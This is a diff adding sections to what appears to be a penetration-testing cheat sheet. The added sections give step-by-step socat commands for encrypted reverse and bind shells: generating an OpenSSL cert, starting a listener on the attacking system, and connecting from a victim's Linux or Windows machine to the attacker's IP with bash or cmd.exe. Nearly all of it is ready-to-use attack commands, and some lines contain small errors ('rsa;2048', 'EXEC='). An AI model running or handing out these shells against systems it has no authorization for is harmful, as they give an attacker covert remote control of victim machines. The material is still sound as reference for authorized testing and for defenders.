@@ -571,6 +571,40 @@ On victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[attack_ip]:4444
 ~~~
 
+#### encrypted socat shell
+Socat can use certs to encrypt traffic. 
+
+create  private key and cert to encrypt traffic
+~~~
+openssl req -newkey rsa;2048 -nodes -keyout enc.key -x509 -days 365 -out enc.crt
+~~~
+Covert it to .pem file needed for socat
+~~~
+cat enc.key enc.crt > enc.pem
+~~~
+start listener on attacking system:
+~~~
+socat -d -d OPENSSL-LISTEN:4433,cert=enc.pem,verify=0,fork STDOUT
+~~~
+connect from victim to complete reverse shell:
+~~~
+linux:
+socat OPENSSL:attack_ip:4433,verify=0 EXEC:/bin/bash
+
+windows:
+socat OPENSSL:attack_ip:4433,verify=0 EXEC:'cmd.exe',pipes
+~~~
+
+#### socat encrypted bind shell
+follow same steps to create the .pem file needed first (above), then:
+~~~
+on victim:
+socat OPENSSL-LISTEN:4433,cert=enc.pem,verify=0,fork EXEC=/bin/bash
+
+on attack system:
+socat - OPENSSL:victim_ip:4433,verify=0
+~~~~
+
 ### Metasploit session sharing through msfd
 
 Unauthenticated way to share msf console for session sharing.
